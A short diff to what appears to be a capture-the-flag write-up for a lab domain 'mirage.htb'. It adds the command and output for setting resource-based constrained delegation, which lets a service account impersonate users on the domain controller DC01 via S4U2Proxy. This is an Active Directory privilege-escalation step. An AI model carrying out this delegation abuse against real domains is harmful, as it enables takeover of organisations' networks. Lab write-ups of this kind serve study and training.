@@ -940,6 +940,21 @@ set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perf
 This is the details taken from the help menu
 
 ```python
+# set_rbcd DC01$ mirage-service$
+Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
+Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000
+
+Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
+Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
+Delegation rights modified successfully!
+mirage-service$ can now impersonate users on DC01$ via S4U2Proxy
+
+# 
+```
+
+Now RBCD should be setup
+
+```python
 
 ```
 
